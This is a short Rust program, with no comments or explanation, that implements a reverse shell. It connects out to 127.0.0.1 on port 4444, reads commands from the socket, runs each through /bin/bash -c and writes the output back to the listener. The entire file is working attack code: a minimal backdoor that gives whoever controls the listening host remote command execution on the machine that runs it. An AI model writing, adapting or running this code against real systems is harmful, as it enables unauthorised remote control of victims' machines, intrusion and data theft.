use std::str;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::Command;


fn main() {
    let mut stream = TcpStream::connect("127.0.0.1:4444")
                                .expect("Couldn't connect to the server...");
    loop {
        let mut buf: [u8; 1024] = [32; 1024];
        if let 0 = stream.read(&mut buf).expect("Error"){
            break;
        } else {
            let output = Command::new("/bin/bash")
                                .arg("-c")
                                .arg(str::from_utf8(&buf).unwrap())
                                .output()
                                .expect("failed to execute process");
            stream.write(&output.stdout).expect("Error writing");
        };
    }

}
